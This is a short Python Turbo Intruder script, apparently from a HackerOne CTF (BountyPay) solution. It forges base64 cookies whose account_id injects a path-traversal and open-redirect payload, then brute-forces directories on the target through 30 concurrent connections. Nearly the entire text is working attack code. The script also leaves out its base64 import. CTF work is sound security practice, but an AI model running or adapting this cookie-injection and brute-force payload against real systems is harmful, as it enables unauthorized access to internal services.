import json

def gencookie(message):
    message = json.dumps({"account_id":"../../../../redirect?url=https://software.bountypay.h1ctf.com/"+message+"#","hash":"de235bffd23df6995ad4e0930baac1a2"})
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')
    return(base64_message)

# Find more example scripts at https://github.com/PortSwigger/turbo-intruder/tree/master/examples
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=3,
                           pipeline=False
                           )
    engine.start()
    for word in open('/Users/yashsodha/Downloads/dirsearch-master/db/dicc.txt'):
        engine.queue(target.req, gencookie(word.rstrip()))

def handleResponse(req, interesting):
    if "404 Not Found" not in req.response and "400 Bad Request" not in req.response:
        table.add(req)
```

